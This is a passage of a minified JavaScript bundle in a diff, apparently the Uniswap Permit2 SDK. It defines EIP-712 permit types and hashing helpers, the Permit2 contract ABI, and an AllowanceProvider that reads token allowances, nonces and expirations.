o=e[i](s),p=o.value}catch(e){return void n(e)}o.done?t(p):Promise.resolve(p).then(r,a)}function P(e){return function(){var t=this,n=arguments;return new Promise((function(r,a){var i=e.apply(t,n);function s(e){b(i,r,a,s,o,"next",e)}function o(e){b(i,r,a,s,o,"throw",e)}s(void 0)}))}}function k(){return(k=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(e[r]=n[r])}return e}).apply(this,arguments)}var A=[{name:"token",type:"address"},{name:"amount",type:"uint256"}],E={PermitTransferFrom:[{name:"permitted",type:"TokenPermissions"},{name:"spender",type:"address"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}],TokenPermissions:A},S={PermitBatchTransferFrom:[{name:"permitted",type:"TokenPermissions[]"},{name:"spender",type:"address"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}],TokenPermissions:A},D=function(){function e(){}return e.getPermitData=function(e,n,r,a){m.gte(e.deadline)||t(!1),l.gte(e.nonce)||t(!1);var i=f(n,r);return function(e){return!Array.isArray(e.permitted)}(e)?(I(e.permitted),{domain:i,types:a?function(e){return k({PermitWitnessTransferFrom:[{name:"permitted",type:"TokenPermissions"},{name:"spender",type:"address"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"},{name:"witness",type:e.witnessTypeName}],TokenPermissions:A},e.witnessType)}(a):E,values:a?Object.assign(e,{witness:a.witness}):e}):(e.permitted.forEach(I),{domain:i,types:a?function(e){return k({PermitBatchWitnessTransferFrom:[{name:"permitted",type:"TokenPermissions[]"},{name:"spender",type:"address"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"},{name:"witness",type:e.witnessTypeName}],TokenPermissions:A},e.witnessType)}(a):S,values:a?Object.assign(e,{witness:a.witness}):e})},e.hash=function(t,r,a,i){var s=e.getPermitData(t,r,a,i);return n._TypedDataEncoder.hash(s.domain,s.types,s.values)},e}();function I(e){d.gte(e.amount)||t(!1)}var L=[{inputs:[],name:"AllowanceExpired",type:"error"},{inputs:[],name:"ExcessiveInvalidation",type:"error"},{inputs:[],name:"InsufficientAllowance",type:"error"},{inputs:[],name:"InvalidAmount",type:"error"},{inputs:[],name:"InvalidContractSignature",type:"error"},{inputs:[],name:"InvalidNonce",type:"error"},{inputs:[],name:"InvalidSignature",type:"error"},{inputs:[],name:"InvalidSigner",type:"error"},{inputs:[],name:"LengthMismatch",type:"error"},{inputs:[],name:"NotSpender",type:"error"},{inputs:[],name:"SignatureExpired",type:"error"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"token",type:"address"},{indexed:!0,internalType:"address",name:"spender",type:"address"},{indexed:!1,internalType:"uint160",name:"amount",type:"uint160"},{indexed:!1,internalType:"uint48",name:"expiration",type:"uint48"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!1,internalType:"address",name:"token",type:"address"},{indexed:!1,internalType:"address",name:"spender",type:"address"}],name:"Lockdown",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"token",type:"address"},{indexed:!0,internalType:"address",name:"spender",type:"address"},{indexed:!1,internalType:"uint48",name:"newNonce",type:"uint48"},{indexed:!1,internalType:"uint48",name:"oldNonce",type:"uint48"}],name:"NonceInvalidation",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!1,internalType:"uint256",name:"word",type:"uint256"},{indexed:!1,internalType:"uint256",name:"mask",type:"uint256"}],name:"UnorderedNonceInvalidation",type:"event"},{inputs:[],name:"DOMAIN_SEPARATOR",outputs:[{internalType:"bytes32",name:"",type:"bytes32"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"",type:"address"},{internalType:"address",name:"",type:"address"},{internalType:"address",name:"",type:"address"}],name:"allowance",outputs:[{internalType:"uint160",name:"amount",type:"uint160"},{internalType:"uint48",name:"expiration",type:"uint48"},{internalType:"uint48",name:"nonce",type:"uint48"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"token",type:"address"},{internalType:"address",name:"spender",type:"address"},{internalType:"uint160",name:"amount",type:"uint160"},{internalType:"uint48",name:"expiration",type:"uint48"}],name:"approve",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"token",type:"address"},{internalType:"address",name:"spender",type:"address"},{internalType:"uint48",name:"newNonce",type:"uint48"}],name:"invalidateNonces",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"uint256",name:"wordPos",type:"uint256"},{internalType:"uint256",name:"mask",type:"uint256"}],name:"invalidateUnorderedNonces",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"address",name:"spender",type:"address"}],internalType:"struct IAllowanceTransfer.TokenSpenderPair[]",name:"approvals",type:"tuple[]"}],name:"lockdown",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"",type:"address"},{internalType:"uint256",name:"",type:"uint256"}],name:"nonceBitmap",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"owner",type:"address"},{components:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint160",name:"amount",type:"uint160"},{internalType:"uint48",name:"expiration",type:"uint48"},{internalType:"uint48",name:"nonce",type:"uint48"}],internalType:"struct IAllowanceTransfer.PermitDetails[]",name:"details",type:"tuple[]"},{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"sigDeadline",type:"uint256"}],internalType:"struct IAllowanceTransfer.PermitBatch",name:"permitBatch",type:"tuple"},{internalType:"bytes",name:"signature",type:"bytes"}],name:"permit",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"owner",type:"address"},{components:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint160",name:"amount",type:"uint160"},{internalType:"uint48",name:"expiration",type:"uint48"},{internalType:"uint48",name:"nonce",type:"uint48"}],internalType:"struct IAllowanceTransfer.PermitDetails",name:"details",type:"tuple"},{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"sigDeadline",type:"uint256"}],internalType:"struct IAllowanceTransfer.PermitSingle",name:"permitSingle",type:"tuple"},{internalType:"bytes",name:"signature",type:"bytes"}],name:"permit",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{components:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],internalType:"struct ISignatureTransfer.TokenPermissions[]",name:"permitted",type:"tuple[]"},{internalType:"uint256",name:"nonce",type:"uint256"},{internalType:"uint256",name:"deadline",type:"uint256"}],internalType:"struct ISignatureTransfer.PermitBatchTransferFrom",name:"permit",type:"tuple"},{internalType:"address",name:"owner",type:"address"},{components:[{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"requestedAmount",type:"uint256"}],internalType:"struct ISignatureTransfer.SignatureTransferDetails[]",name:"transferDetails",type:"tuple[]"},{internalType:"bytes",name:"signature",type:"bytes"}],name:"permitTransferFrom",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{components:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],internalType:"struct ISignatureTransfer.TokenPermissions",name:"permitted",type:"tuple"},{internalType:"uint256",name:"nonce",type:"uint256"},{internalType:"uint256",name:"deadline",type:"uint256"}],internalType:"struct ISignatureTransfer.PermitTransferFrom",name:"permit",type:"tuple"},{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"requestedAmount",type:"uint256"},{internalType:"bytes",name:"signature",type:"bytes"}],name:"permitTransferFrom",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{components:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],internalType:"struct ISignatureTransfer.TokenPermissions",name:"permitted",type:"tuple"},{internalType:"uint256",name:"nonce",type:"uint256"},{internalType:"uint256",name:"deadline",type:"uint256"}],internalType:"struct ISignatureTransfer.PermitTransferFrom",name:"permit",type:"tuple"},{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"requestedAmount",type:"uint256"},{internalType:"bytes32",name:"witness",type:"bytes32"},{internalType:"string",name:"witnessTypeName",type:"string"},{internalType:"string",name:"witnessType",type:"string"},{internalType:"bytes",name:"signature",type:"bytes"}],name:"permitWitnessTransferFrom",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{components:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],internalType:"struct ISignatureTransfer.TokenPermissions[]",name:"permitted",type:"tuple[]"},{internalType:"uint256",name:"nonce",type:"uint256"},{internalType:"uint256",name:"deadline",type:"uint256"}],internalType:"struct ISignatureTransfer.PermitBatchTransferFrom",name:"permit",type:"tuple"},{internalType:"address",name:"owner",type:"address"},{components:[{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"requestedAmount",type:"uint256"}],internalType:"struct ISignatureTransfer.SignatureTransferDetails[]",name:"transferDetails",type:"tuple[]"},{internalType:"bytes32",name:"witness",type:"bytes32"},{internalType:"string",name:"witnessTypeName",type:"string"},{internalType:"string",name:"witnessType",type:"string"},{internalType:"bytes",name:"signature",type:"bytes"}],name:"permitWitnessTransferFrom",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"token",type:"address"},{internalType:"address",name:"from",type:"address"},{internalType:"address",name:"to",type:"address"},{internalType:"uint160",name:"amount",type:"uint160"}],name:"transferFrom",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"from",type:"address"},{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint160",name:"amount",type:"uint160"},{internalType:"address",name:"to",type:"address"}],internalType:"struct IAllowanceTransfer.AllowanceTransferDetails[]",name:"transferDetails",type:"tuple[]"}],name:"transferFrom",outputs:[],stateMutability:"nonpayable",type:"function"}];exports.AllowanceProvider=function(){function e(e,t){this.provider=e,this.permit2Address=t,this.permit2=new a.Contract(this.permit2Address,L,this.provider)}var t=e.prototype;return t.getAllowanceData=function(){var e=P(x().mark((function e(t,n,r){return x().wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,this.permit2.allowance(n,t,r);case 2:return e.abrupt("return",e.sent);case 3:case"end":return e.stop()}}),e,this)})));return function(t,n,r){return e.apply(this,arguments)}}(),t.getAllowance=function(){var e=P(x().mark((function e(t,n,r){return x().wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,this.getAllowanceData(t,n,r);case 2:return e.abrupt("return",e.sent.amount);case 3:case"end":return e.stop()}}),e,this)})));return function(t,n,r){return e.apply(this,arguments)}}(),t.getNonce=function(){var e=P(x().mark((function e(t,n,r){return x().wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,this.getAllowanceData(t,n,r);case 2:return e.abrupt("return",e.sent.nonce);case 3:case"end":return e.stop()}}),e,this)})));return function(t,n,r){return e.apply(this,arguments)}}(),t.getExpiration=function(){var e=P(x().mark((function e(t,n,r){return x().wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,this.getAllowanceData(t,n,r);case 2:return e.abrupt("return",e.sent.expiration);case 3:case"end":return e.stop()}}),e,this)})));return function(t,n,r){return e.apply(this,arguments)}}(),e}(),exports.AllowanceTransfer=g,exports.InstantExpiration=c,exports.MaxAllowanceExpiration=u,exports.MaxAllowanceTransferAmount=p,exports.MaxOrderedNonce=y,exports.MaxSigDeadline=m,exports.MaxSignatureTransferAmount=d,exports.MaxUint160=s,exports.MaxUint256=o,exports.MaxUint48=i,exports.MaxUnorderedNonce=l,exports.PERMIT2_ADDRESS="0x000000000022D473030F116dDEE9F6B43aC78BA3",exports.SignatureTransfer=D;
+"use strict";Object.defineProperty(exports,"__esModule",{value:!0});var e,t=(e=require("tiny-invariant"))&&"object"==typeof e&&"default"in e?e.default:e,n=require("@ethersproject/hash"),r=require("@ethersproject/bignumber"),a=require("@ethersproject/contracts"),i=r.BigNumber.from("0xffffffffffff"),s=r.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffff"),o=r.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),p=s,u=i,y=i,d=o,l=o,m=o,c=r.BigNumber.from(0);function f(e,t){return{name:"Permit2",chainId:t,verifyingContract:e}}var h=[{name:"token",type:"address"},{name:"amount",type:"uint160"},{name:"expiration",type:"uint48"},{name:"nonce",type:"uint48"}],T={PermitSingle:[{name:"details",type:"PermitDetails"},{name:"spender",type:"address"},{name:"sigDeadline",type:"uint256"}],PermitDetails:h},v={PermitBatch:[{name:"details",type:"PermitDetails[]"},{name:"spender",type:"address"},{name:"sigDeadline",type:"uint256"}],PermitDetails:h},g=function(){function e(){}return e.getPermitData=function(e,n,r){m.gte(e.sigDeadline)||t(!1);var a=f(n,r);return function(e){return!Array.isArray(e.details)}(e)?(w(e.details),{domain:a,types:T,values:e}):(e.details.forEach(w),{domain:a,types:v,values:e})},e.hash=function(t,r,a){var i=e.getPermitData(t,r,a);return n._TypedDataEncoder.hash(i.domain,i.types,i.values)},e}();function w(e){y.gte(e.nonce)||t(!1),p.gte(e.amount)||t(!1),u.gte(e.expiration)||t(!1)}function x(){x=function(){return e};var e={},t=Object.prototype,n=t.hasOwnProperty,r="function"==typeof Symbol?Symbol:{},a=r.iterator||"@@iterator",i=r.asyncIterator||"@@asyncIterator",s=r.toStringTag||"@@toStringTag";function o(e,t,n){return Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}),e[t]}try{o({},"")}catch(e){o=function(e,t,n){return e[t]=n}}function p(e,t,n,r){var a=Object.create((t&&t.prototype instanceof d?t:d).prototype),i=new k(r||[]);return a._invoke=function(e,t,n){var r="suspendedStart";return function(a,i){if("executing"===r)throw new Error("Generator is already running");if("completed"===r){if("throw"===a)throw i;return{value:void 0,done:!0}}for(n.method=a,n.arg=i;;){var s=n.delegate;if(s){var o=w(s,n);if(o){if(o===y)continue;return o}}if("next"===n.method)n.sent=n._sent=n.arg;else if("throw"===n.method){if("suspendedStart"===r)throw r="completed",n.arg;n.dispatchException(n.arg)}else"return"===n.method&&n.abrupt("return",n.arg);r="executing";var p=u(e,t,n);if("normal"===p.type){if(r=n.done?"completed":"suspendedYield",p.arg===y)continue;return{value:p.arg,done:n.done}}"throw"===p.type&&(r="completed",n.method="throw",n.arg=p.arg)}}}(e,n,i),a}function u(e,t,n){try{return{type:"normal",arg:e.call(t,n)}}catch(e){return{type:"throw",arg:e}}}e.wrap=p;var y={};function d(){}function l(){}function m(){}var c={};o(c,a,(function(){return this}));var f=Object.getPrototypeOf,h=f&&f(f(A([])));h&&h!==t&&n.call(h,a)&&(c=h);var T=m.prototype=d.prototype=Object.create(c);function v(e){["next","throw","return"].forEach((function(t){o(e,t,(function(e){return this._invoke(t,e)}))}))}function g(e,t){var r;this._invoke=function(a,i){function s(){return new t((function(r,s){!function r(a,i,s,o){var p=u(e[a],e,i);if("throw"!==p.type){var y=p.arg,d=y.value;return d&&"object"==typeof d&&n.call(d,"__await")?t.resolve(d.__await).then((function(e){r("next",e,s,o)}),(function(e){r("throw",e,s,o)})):t.resolve(d).then((function(e){y.value=e,s(y)}),(function(e){return r("throw",e,s,o)}))}o(p.arg)}(a,i,r,s)}))}return r=r?r.then(s,s):s()}}function w(e,t){var n=e.iterator[t.method];if(void 0===n){if(t.delegate=null,"throw"===t.method){if(e.iterator.return&&(t.method="return",t.arg=void 0,w(e,t),"throw"===t.method))return y;t.method="throw",t.arg=new TypeError("The iterator does not provide a 'throw' method")}return y}var r=u(n,e.iterator,t.arg);if("throw"===r.type)return t.method="throw",t.arg=r.arg,t.delegate=null,y;var a=r.arg;return a?a.done?(t[e.resultName]=a.value,t.next=e.nextLoc,"return"!==t.method&&(t.method="next",t.arg=void 0),t.delegate=null,y):a:(t.method="throw",t.arg=new TypeError("iterator result is not an object"),t.delegate=null,y)}function b(e){var t={tryLoc:e[0]};1 in e&&(t.catchLoc=e[1]),2 in e&&(t.finallyLoc=e[2],t.afterLoc=e[3]),this.tryEntries.push(t)}function P(e){var t=e.completion||{};t.type="normal",delete t.arg,e.completion=t}function k(e){this.tryEntries=[{tryLoc:"root"}],e.forEach(b,this),this.reset(!0)}function A(e){if(e){var t=e[a];if(t)return t.call(e);if("function"==typeof e.next)return e;if(!isNaN(e.length)){var r=-1,i=function t(){for(;++r<e.length;)if(n.call(e,r))return t.value=e[r],t.done=!1,t;return t.value=void 0,t.done=!0,t};return i.next=i}}return{next:E}}function E(){return{value:void 0,done:!0}}return l.prototype=m,o(T,"constructor",m),o(m,"constructor",l),l.displayName=o(m,s,"GeneratorFunction"),e.isGeneratorFunction=function(e){var t="function"==typeof e&&e.constructor;return!!t&&(t===l||"GeneratorFunction"===(t.displayName||t.name))},e.mark=function(e){return Object.setPrototypeOf?Object.setPrototypeOf(e,m):(e.__proto__=m,o(e,s,"GeneratorFunction")),e.prototype=Object.create(T),e},e.awrap=function(e){return{__await:e}},v(g.prototype),o(g.prototype,i,(function(){return this})),e.AsyncIterator=g,e.async=function(t,n,r,a,i){void 0===i&&(i=Promise);var s=new g(p(t,n,r,a),i);return e.isGeneratorFunction(n)?s:s.next().then((function(e){return e.done?e.value:s.next()}))},v(T),o(T,s,"Generator"),o(T,a,(function(){return this})),o(T,"toString",(function(){return"[object Generator]"})),e.keys=function(e){var t=[];for(var n in e)t.push(n);return t.reverse(),function n(){for(;t.length;){var r=t.pop();if(r in e)return n.value=r,n.done=!1,n}return n.done=!0,n}},e.values=A,k.prototype={constructor:k,reset:function(e){if(this.prev=0,this.next=0,this.sent=this._sent=void 0,this.done=!1,this.delegate=null,this.method="next",this.arg=void 0,this.tryEntries.forEach(P),!e)for(var t in this)"t"===t.charAt(0)&&n.call(this,t)&&!isNaN(+t.slice(1))&&(this[t]=void 0)},stop:function(){this.done=!0;var e=this.tryEntries[0].completion;if("throw"===e.type)throw e.arg;return this.rval},dispatchException:function(e){if(this.done)throw e;var t=this;function r(n,r){return s.type="throw",s.arg=e,t.next=n,r&&(t.method="next",t.arg=void 0),!!r}for(var a=this.tryEntries.length-1;a>=0;--a){var i=this.tryEntries[a],s=i.completion;if("root"===i.tryLoc)return r("end");if(i.tryLoc<=this.prev){var o=n.call(i,"catchLoc"),p=n.call(i,"finallyLoc");if(o&&p){if(this.prev<i.catchLoc)return r(i.catchLoc,!0);if(this.prev<i.finallyLoc)return r(i.finallyLoc)}else if(o){if(this.prev<i.catchLoc)return r(i.catchLoc,!0)}else{if(!p)throw new Error("try statement without catch or finally");if(this.prev<i.finallyLoc)return r(i.finallyLoc)}}}},abrupt:function(e,t){for(var r=this.tryEntries.length-1;r>=0;--r){var a=this.tryEntries[r];if(a.tryLoc<=this.prev&&n.call(a,"finallyLoc")&&this.prev<a.finallyLoc){var i=a;break}}i&&("break"===e||"continue"===e)&&i.tryLoc<=t&&t<=i.finallyLoc&&(i=null);var s=i?i.completion:{};return s.type=e,s.arg=t,i?(this.method="next",this.next=i.finallyLoc,y):this.complete(s)},complete:function(e,t){if("throw"===e.type)throw e.arg;return"break"===e.type||"continue"===e.type?this.next=e.arg:"return"===e.type?(this.rval=this.arg=e.arg,this.method="return",this.next="end"):"normal"===e.type&&t&&(this.next=t),y},finish:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.finallyLoc===e)return this.complete(n.completion,n.afterLoc),P(n),y}},catch:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.tryLoc===e){var r=n.completion;if("throw"===r.type){var a=r.arg;P(n)}return a}}throw new Error("illegal catch attempt")},delegateYield:function(e,t,n){return this.delegate={iterator:A(e),resultName:t,nextLoc:n},"next"===this.method&&(this.arg=void 0),y}},e}function b(e,t,n,r,a,i,s){try{var o=e[i](s),p=o.value}catch(e){return void n(e)}o.done?t(p):Promise.resolve(p).then(r,a)}function P(e){return function(){var t=this,n=arguments;return new Promise((function(r,a){var i=e.apply(t,n);function s(e){b(i,r,a,s,o,"next",e)}function o(e){b(i,r,a,s,o,"throw",e)}s(void 0)}))}}function k(){return(k=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(e[r]=n[r])}return e}).apply(this,arguments)}var A=[{name:"token",type:"address"},{name:"amount",type:"uint256"}],E={PermitTransferFrom:[{name:"permitted",type:"TokenPermissions"},{name:"spender",type:"address"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}],TokenPermissions:A},S={PermitBatchTransferFrom:[{name:"permitted",type:"TokenPermissions[]"},{name:"spender",type:"address"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}],TokenPermissions:A},D=function(){function e(){}return e.getPermitData=function(e,n,r,a){m.gte(e.deadline)||t(!1),l.gte(e.nonce)||t(!1);var i=f(n,r);return function(e){return!Array.isArray(e.permitted)}(e)?(I(e.permitted),{domain:i,types:a?function(e){return k({PermitWitnessTransferFrom:[{name:"permitted",type:"TokenPermissions"},{name:"spender",type:"address"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"},{name:"witness",type:e.witnessTypeName}],TokenPermissions:A},e.witnessType)}(a):E,values:a?Object.assign(e,{witness:a.witness}):e}):(e.permitted.forEach(I),{domain:i,types:a?function(e){return k({PermitBatchWitnessTransferFrom:[{name:"permitted",type:"TokenPermissions[]"},{name:"spender",type:"address"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"},{name:"witness",type:e.witnessTypeName}],TokenPermissions:A},e.witnessType)}(a):S,values:a?Object.assign(e,{witness:a.witness}):e})},e.hash=function(t,r,a,i){var s=e.getPermitData(t,r,a,i);return n._TypedDataEncoder.hash(s.domain,s.types,s.values)},e}();function I(e){d.gte(e.amount)||t(!1)}var L=[{inputs:[],name:"AllowanceExpired",type:"error"},{inputs:[],name:"ExcessiveInvalidation",type:"error"},{inputs:[],name:"InsufficientAllowance",type:"error"},{inputs:[],name:"InvalidAmount",type:"error"},{inputs:[],name:"InvalidContractSignature",type:"error"},{inputs:[],name:"InvalidNonce",type:"error"},{inputs:[],name:"InvalidSignature",type:"error"},{inputs:[],name:"InvalidSigner",type:"error"},{inputs:[],name:"LengthMismatch",type:"error"},{inputs:[],name:"NotSpender",type:"error"},{inputs:[],name:"SignatureExpired",type:"error"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"token",type:"address"},{indexed:!0,internalType:"address",name:"spender",type:"address"},{indexed:!1,internalType:"uint160",name:"amount",type:"uint160"},{indexed:!1,internalType:"uint48",name:"expiration",type:"uint48"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!1,internalType:"address",name:"token",type:"address"},{indexed:!1,internalType:"address",name:"spender",type:"address"}],name:"Lockdown",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"token",type:"address"},{indexed:!0,internalType:"address",name:"spender",type:"address"},{indexed:!1,internalType:"uint48",name:"newNonce",type:"uint48"},{indexed:!1,internalType:"uint48",name:"oldNonce",type:"uint48"}],name:"NonceInvalidation",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!1,internalType:"uint256",name:"word",type:"uint256"},{indexed:!1,internalType:"uint256",name:"mask",type:"uint256"}],name:"UnorderedNonceInvalidation",type:"event"},{inputs:[],name:"DOMAIN_SEPARATOR",outputs:[{internalType:"bytes32",name:"",type:"bytes32"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"",type:"address"},{internalType:"address",name:"",type:"address"},{internalType:"address",name:"",type:"address"}],name:"allowance",outputs:[{internalType:"uint160",name:"amount",type:"uint160"},{internalType:"uint48",name:"expiration",type:"uint48"},{internalType:"uint48",name:"nonce",type:"uint48"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"token",type:"address"},{internalType:"address",name:"spender",type:"address"},{internalType:"uint160",name:"amount",type:"uint160"},{internalType:"uint48",name:"expiration",type:"uint48"}],name:"approve",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"token",type:"address"},{internalType:"address",name:"spender",type:"address"},{internalType:"uint48",name:"newNonce",type:"uint48"}],name:"invalidateNonces",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"uint256",name:"wordPos",type:"uint256"},{internalType:"uint256",name:"mask",type:"uint256"}],name:"invalidateUnorderedNonces",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"address",name:"spender",type:"address"}],internalType:"struct IAllowanceTransfer.TokenSpenderPair[]",name:"approvals",type:"tuple[]"}],name:"lockdown",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"",type:"address"},{internalType:"uint256",name:"",type:"uint256"}],name:"nonceBitmap",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"owner",type:"address"},{components:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint160",name:"amount",type:"uint160"},{internalType:"uint48",name:"expiration",type:"uint48"},{internalType:"uint48",name:"nonce",type:"uint48"}],internalType:"struct IAllowanceTransfer.PermitDetails[]",name:"details",type:"tuple[]"},{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"sigDeadline",type:"uint256"}],internalType:"struct IAllowanceTransfer.PermitBatch",name:"permitBatch",type:"tuple"},{internalType:"bytes",name:"signature",type:"bytes"}],name:"permit",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"owner",type:"address"},{components:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint160",name:"amount",type:"uint160"},{internalType:"uint48",name:"expiration",type:"uint48"},{internalType:"uint48",name:"nonce",type:"uint48"}],internalType:"struct IAllowanceTransfer.PermitDetails",name:"details",type:"tuple"},{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"sigDeadline",type:"uint256"}],internalType:"struct IAllowanceTransfer.PermitSingle",name:"permitSingle",type:"tuple"},{internalType:"bytes",name:"signature",type:"bytes"}],name:"permit",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{components:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],internalType:"struct ISignatureTransfer.TokenPermissions[]",name:"permitted",type:"tuple[]"},{internalType:"uint256",name:"nonce",type:"uint256"},{internalType:"uint256",name:"deadline",type:"uint256"}],internalType:"struct ISignatureTransfer.PermitBatchTransferFrom",name:"permit",type:"tuple"},{internalType:"address",name:"owner",type:"address"},{components:[{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"requestedAmount",type:"uint256"}],internalType:"struct ISignatureTransfer.SignatureTransferDetails[]",name:"transferDetails",type:"tuple[]"},{internalType:"bytes",name:"signature",type:"bytes"}],name:"permitTransferFrom",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{components:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],internalType:"struct ISignatureTransfer.TokenPermissions",name:"permitted",type:"tuple"},{internalType:"uint256",name:"nonce",type:"uint256"},{internalType:"uint256",name:"deadline",type:"uint256"}],internalType:"struct ISignatureTransfer.PermitTransferFrom",name:"permit",type:"tuple"},{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"requestedAmount",type:"uint256"},{internalType:"bytes",name:"signature",type:"bytes"}],name:"permitTransferFrom",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{components:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],internalType:"struct ISignatureTransfer.TokenPermissions",name:"permitted",type:"tuple"},{internalType:"uint256",name:"nonce",type:"uint256"},{internalType:"uint256",name:"deadline",type:"uint256"}],internalType:"struct ISignatureTransfer.PermitTransferFrom",name:"permit",type:"tuple"},{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"requestedAmount",type:"uint256"},{internalType:"bytes32",name:"witness",type:"bytes32"},{internalType:"string",name:"witnessTypeName",type:"string"},{internalType:"string",name:"witnessType",type:"string"},{internalType:"bytes",name:"signature",type:"bytes"}],name:"permitWitnessTransferFrom",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{components:[{components:[{internalType:"address",name:"token",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],internalType:"struct ISignatureTransfer.TokenPermissions[]",name:"permitted",type:"tuple[]"},{internalType:"uint256",name:"nonce",type:"uint256"},{internalType:"uint256",name:"deadline",type:"uint256"}],internalType:"struct ISignatureTransfer.PermitBatchTransferFrom",name:"permit",type:"tuple"},{internalType:"address",name:"owner",type:"address"},{components:[{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"requestedAmount",type:"uint256"}],internalType:"struct 